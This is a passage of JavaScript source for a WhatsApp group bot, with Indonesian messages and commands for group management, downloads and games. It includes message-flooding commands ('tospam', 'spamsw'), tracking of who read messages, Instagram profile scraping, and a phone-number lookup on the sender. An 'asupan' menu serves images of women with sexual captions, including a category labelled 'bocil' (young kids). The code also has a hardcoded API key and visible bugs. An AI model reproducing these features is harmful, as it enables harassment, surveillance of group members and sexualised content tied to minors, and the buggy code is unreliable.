} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Succes mematikan autovn`)
} else {
reply(`Pilih on atau off`)
}
break
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antical)return reply('Sudah diaktifkan sebelumnya!')
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if(!antical)return reply('Sudah di NonAktifkan sebelumnya!')
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break

case 'autoread':
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
      case "autojoin":
        if (!isGroup) return reply("Khusus di grup");
        if (!mek.key.fromMe) return reply("Khusus owner");
        if (args[0] == "on") {
          if (autojoin == true) return reply("Sudah aktif!!");
          autojoin = true;
          reply("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >-------------------
      case "listonline": 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(KonX.chats.get(id).presences),
            KonX.user.jid,
          ];
          KonX.reply(
            m.chat,
            "┌─〔 Daftar Online 〕\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n└────",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
         } catch (e) {
          m.reply("");
        }
        break;
        case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
        case 'tictactoe': 
            case 'ttt': 
            case 'ttc':
            if (!isGroup) return reply(`hanya bisa di group`)          
	        if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('tag orangnya')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            if (isTicTacToe(from, tictactoe)) return reply(`Masih ada sesi yg blum selesai`)
            if (args.length < 0) return reply(`Kirim perintah ${prefix}tictactoe @tag`)
            if (mentioned.length !== 0){
      		if (mentioned[0] === sender) return reply(`Sad amat main ama diri sendiri`)
            let h = randomNomor(1000)
            mentions(monospace(`@${sender.split('@')[0]} kamu bertarung dengan @${mentioned[0].split('@')[0]} untuk bermain TictacToe	\n\nKirim Y untuk menerima dan T untuk menolak\n\nHadiah : ${h} limit`), [sender, mentioned[0]], false)
            tictactoe.push({
            id: from,
            status: null,
            hadiah: h,
            penantang: sender,
            ditantang: mentioned[0],
            TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
            })
            } else {
            reply(`Kirim perintah ${prefix}tictactoe @tag`)
            }
            break
            case 'afk':
            alasan = args.join(" ")
            afkk[sender.split('@')[0]] = alasan.toLowerCase()
            fs.writeFileSync("./database/afk.json", JSON.stringify(afkk))
            ini_mn1k = "Anda telah afk\n\n"
            if (alasan != "") {
            ini_mn1k += "Dengan alasan :"  + alasan
            }
            reply(ini_mn1k)
            break
        case "ssweb":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (args.length) return reply(mess.ban)
  reply(mess.wait)
       ini_url = body.slice(7)
					atetepe = await getBuffer(`api${ini_url}`)
					KonX.sendMessage(from, atetepe, image, { quoted: mek })
					break
					case 'ppcp':
case 'ppcouple':
if (!isRegistered) return reply(mess.banned)
anu = await fetchJson(`https://api.caliph71.xyz/api/ppcouple?apikey=PvDArEz6`)
buff1 = await getBuffer (anu.result.male)
KonX.sendMessage(from, buff1, image, {quoted: mek, caption: 'COWOK'})
buff2 =await getBuffer (anu.result.female)
KonX.sendMessage(from, buff2, image, {quoted: mek, caption: 'CEWEK'})
break
					case 'profile':
              KonX.updatePresence(from, Presence.composing)
              try {
              profil = await KonX.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
              } catch {
              profil = errorImg
}
              thu = await KonX.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
              me = KonX.user
              uptime = process.uptime()
              profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: -\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
              buff = await getBuffer(profil)
              KonX.sendMessage(from, buff, image, {quoted: freply, caption: profile})
              break
        case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  KonX.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  KonX.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await KonX.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  KonX.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await KonX.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  KonX.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await KonX.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  KonX.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	  case 'brainly':
             brainly(args.join(" ")).then(res => {
             hmm = '────────────\n'
             for (let Y of res.data) {
             hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
}
             reply(hmm)
             console.log(res)
})
             break
	  case 'bisakah':
  if (!isGroup) return reply(mess.only.group)
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              KonX.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: mek })
              break
       case 'kapankah':
         if (!isGroup) return reply(mess.only.group)
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              KonX.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
              break
      case "sider":
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await KonX.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await KonX.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: KonX.parseMention(txt),
          },
        });
        break;
      case "q":
        if (!m.quoted) return reply("reply message!");
        let qse = KonX.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin);
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          KonX.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          KonX.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          KonX.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
      case "add":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin);
        if (!isBotGroupAdmins) return reply("Bot not admin");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          add(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          KonX.groupAdd(from, [anu]);
          reply(mess.success);
        } else {
          add(from, mentioned);
          reply(mess.success);
        }
        break;
        case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await KonX.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
        case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
        case 'mediafire':
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 30000) return reply(`*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}

_File sedang dikirim, Silahkan tunggu bebeperapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
case 'igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    KonX.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    KonX.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
case 'ig':
            if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            reply(mess.wait)
	         hx.igdl(args[0])
	         .then(async(result) => {
            for(let i of result.medias){
            if(i.url.includes('mp4')){
            let link = await getBuffer(i.url)
            KonX.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
            } else {
            let link = await getBuffer(i.url)
            KonX.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})            
            }
            }
            });
	         break
            case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break            
case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
            case 'ttp':  
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${c}`)
                    KonX.sendMessage(from, anu1, image, {quoted: mek, caption : `${prefix}sticker`})
                    break
            case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					KonX.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break
            case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktod':
if (args.length < 1) return reply("```Mana linknya tot```")
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('```Invalid link```')
ttw = await getBuffer('https://telegra.ph/file/8bf0c684b5b9bda790677.jpg')
pnn =await KonX.prepareMessage(from, ttw, image)
tete = [
{buttonId: `${prefix}tiktokwm ${args.join(' ')}`, buttonText: {displayText: 'WM'}, type: 1},
{buttonId: `${prefix}tiktoknowm ${args.join(' ')}`, buttonText: {displayText: 'NOWM'}, type: 1},
{buttonId: `${prefix}tiktokmusic ${args.join(' ')}`, buttonText: {displayText: 'MUSIC'}, type: 1}
]
ttbut = {
imageMessage: pnn.message.imageMessage,
contentText: `Hai Kak ${pushname} Bot Telah Mendapatkan Title Tersebut , Silahkan Pilih Tombol Akses Di Bawah`,
footerText: `© By Alya✓Chan`,
buttons: tete,
headerType: 4
}
await KonX.sendMessage(from, ttbut, MessageType.buttonsMessage, {quoted:mek})
break
case "tiktokmusic": 		
 		return reply('Maaf Fitur Titok-Audio Tidak supoort') 		
     		break
case 'tiktokwm':
      if (args.length < 1) return reply (mess.banned)
reply(mess.wait)
anu = await fetchJson (`https://docs-jojo.herokuapp.com/api/tiktok_wm?url=${args.join(' ')}`)
buffer = await getBuffer (anu.download)
KonX.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek})
break
case 'tiktoknowm':                   
if (!c) return reply('Linknya?')
var { TiktokDownloader } = require('./lib/tiktokdl')
reply(mess.wait)
res = await TiktokDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
break
                    case 'tourl':
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await KonX.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
      case "getbio":
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await KonX.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
      // Get Name
      case "getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          KonX.contacts[ambl] != undefined
            ? KonX.contacts[ambl].sname || KonX.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        KonX.groupUpdateDescription(from, `${args.join(" ")}`);
        KonX.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
      // Set Name Group
      case "setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        KonX.groupUpdateSubject(from, `${args.join(" ")}`);
        KonX.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break;
      // Group Info
      case "groupinfo":
        if (!isGroup) return;
        ppUrl = await KonX.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        KonX.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`,
        });
        break;
      // Demote Admins
      case "demote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        KonX.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes demote`;
        KonX.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
         //// PEMBATAS MENU ASUPAN \\\
 //======= LIST ASUPANNYA=====/\\\
 case 'asupan':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 listMsg = {
 buttonText: 'LIST ASUPAN',
 footerText: 'Silahkan pilih list asupan di bawah︎',
 description: `Hai kak @${sender.split('@')[0]}, Silahkan pilih asupan disini`,
 sections: [
                     {
                      "title": `${jam} - ${week} ${weton} - ${date}`,
 rows: [
                          {
                              "title": "random",
                              "rowId": ""
                           },
                           {
                             "title": "cecanrandom",
                              "rowId": ""
                          },
                          {
                              "title": "cecanvietnam",
                              "rowId": ""
                           },
                           {
                              "title": "cecanmalaysia",
                              "rowId": ""
                           },
                           {
                              "title": "cecankorea",
                              "rowId": ""
                           },
                           {
                              "title": "cecanindonesia",
                              "rowId": ""
                           },
                           {
                              "title": "cecanjepang",
                              "rowId": ""
                           },
                           {
                             "title": "cecanthailand",
                              "rowId": ""
                          },
                          {
                              "title": "hijaber",
                              "rowId": ""
                           },
                           {
                              "title": "santuy",
                              "rowId": ""
                           },
                           {
                              "title": "ukhti",
                              "rowId": ""
                           },
                           {
                              "title": "bocil",
                              "rowId": ""
                           },
                           {
                              "title": "ghea",
                              "rowId": ""
                           },
                           {
                              "title": "rika",
                              "rowId": ""
                           },
                           {
                              "title": ".....",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
KonX.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:ftrol})
break
case 'updatemenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6281212083401@s.whatsapp.net"
        dtod = '6281212083401'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
*BOTZ TIDAK MENGGUNAKAN PREFIX YA*\n\nYt\nGithub\nNoakmal\nGrup\nNonaufal\nNoridho\nScbot\nBot`
sendButLocation(from, `${menu}`,`@${dtod.split("@")[0]} @${dtod.split("@")[0]} Hallo bot ini gk pakek prefix`, {jpegThumbnail:iye}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🗣シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'bc':
     case 'broadcast':
    
           
      if (!isOwner && !mek.key.fromMe) return     
            
      if (args.length < 1) return reply('teks?')
            anu100 = await Fix.chats.all()
            if (isMedia && !Fix.message.videoMessage || isQuotedImage) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dha).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dha
            bc100 = await Fix.downloadMediaMessage(encmedia)
            for (let _ of anu100) {
            Fix.sendMessage(_.jid, bc100, image, {quoted: freply, caption: `*「 Bc By Naufal 」*\n\n${body.slice(4)}`})
}
            fakestatus('Suksess broadcast')
            } else {
            for (let _ of anu100) {
            Fix.sendMessage(_.jid, 
			{"contentText": `*「 Bc By Naufal 」*\n\n${body.slice(4)}`,
			"footerText": `*Active* : _${kyun(run)}_\n_Created By FixMood_`,
			"buttons": [
			{"buttonId": `${prefix}sc`,
			"buttonText": {"displayText": "Script Bot 📍"
			},"type": "RESPONSE"},
				
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: newfoto,
			}}, MessageType.buttonsMessage )
}
            freply('Suksess broadcast')
}
            break
 //━━━━━━━━━━━━━━━[ BAHAN ASUPAN ]━━━━━━━━━━━━━━━━━//
 case 'cecanvietnam':
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
KonX.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan berdiri ya anunya'})
break
case 'cecanrandom':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
KonX.sendMessage(from, buffer, image, {quoted: fvid, caption: ''})
break
case 'hijaber':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
KonX.sendMessage(from, buffer, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'santuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
KonX.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'ukhti':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
KonX.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'bocil':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
KonX.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'ghea':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
KonX.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'rika':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
KonX.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
//━━━━━━━━━━━━━━━[ FITUR CECAN ]━━━━━━━━━━━━━━━━━//
case 'cecanmalaysia':
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/malaysia?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
KonX.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'cecankorea':

huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/korea?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
KonX.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'cecanindonesia':

huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/indonesia?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
KonX.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'})
break
case 'cecanjapan':

